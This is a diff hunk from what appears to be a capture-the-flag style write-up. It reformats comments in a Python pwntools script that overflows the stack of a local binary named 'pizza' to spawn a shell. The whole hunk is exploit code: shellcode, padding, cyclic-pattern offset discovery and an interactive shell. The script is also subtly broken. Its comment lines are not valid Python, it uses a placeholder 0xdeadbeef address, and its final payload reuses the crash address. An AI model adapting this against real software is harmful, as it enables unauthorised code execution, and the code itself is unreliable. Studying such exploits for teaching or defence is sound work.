@@ -36,26 +36,26 @@ Below is a script in python to run the pizza program, getting the pizza program 
 
 from pwn import *
 
---Setting up context
+`Setting up context`
 context.arch = 'amd64'
 context.os = 'linux'
 
---Defining the targeted executable
+`Defining the targeted executable`
 binary = './pizza'
 
---Define payload
+`Define payload`
 offset = 72  # found via manual testing
 shellcode = asm(shellcraft.amd64.linux.sh())
 padding = b'A' * (offset - len(shellcode))
 payload = shellcode + padding + p64(0xdeadbeef)
 
--- Starting the pizza program
+`Starting the pizza program`
 p = process(binary)
 
---Sending payload
+`Sending payload`
 p.sendline(payload)
 
--- Getting RIP offset
+`Getting RIP offset`
 pattern = cyclic(1000, n=8)
 p = process(binary)
 p.sendline(pattern)
@@ -64,14 +64,14 @@ core = p.corefile
 rip_offset = cyclic_find(core.rip, n=8)
 log.info(f'RIP offset: {rip_offset}')
 
---Building final payload
+`Building final payload`
 padding = b'A' * rip_offset
 rip = p64(core.rip)
 payload = padding + rip + b'\n'
 p = process(binary)
 p.send(payload)
 
---Interacting with shell
+`Interacting with shell`
 p.interactive()
 
 '''
